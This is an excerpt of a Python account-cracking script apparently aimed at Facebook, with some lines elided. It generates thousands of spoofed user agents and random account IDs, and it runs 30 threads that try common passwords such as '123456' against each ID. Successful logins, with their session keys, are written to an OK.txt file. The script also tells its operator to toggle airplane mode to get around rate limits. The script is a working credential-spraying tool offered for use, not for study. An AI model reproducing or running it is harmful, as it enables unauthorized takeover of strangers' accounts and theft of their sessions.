...
print("\n\033[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mGENERATING USER AGENTS...\033[0m")
...
for xd in range(10000):
    ...
    ugen.append(uaku2)
for agenku in range(10000): # windows agents
...
print("\n\033[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mUSER AGENTS GENERATION DONE!\033[0m")
time.sleep(1)
...
def main():
   try:
      ...
      for i in range(int(limit)):
         uid=year_code+str(random.choice(range(1000000000,1999999999)))
         uids.append(uid)
      with tred(max_workers=30) as executor:
         ...
         print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER 5 MINUTE ')
         linex()
         for uid in uids:
               executor.submit(login,uid)
      line()
      print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!')
      linex()
      print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}')
      linex()
      input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mPRESS ENTER TO RUN THE SCRIPT AGAIN...\33[38;5;160m!\033[1;37m')
      main()
   except KeyboardInterrupt:
      print("\n\033[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSCRIPT TERMINATED BY USER\033[0m")
      exit()
...
def login(uid):
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            saving_dir = "/sdcard/" if os.path.isdir("/sdcard/") else "./"
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                open(f"{saving_dir}OK.txt","a").write(uid+"|"+pw+"|"+rp["session_key"]+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                open(f"{saving_dir}OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
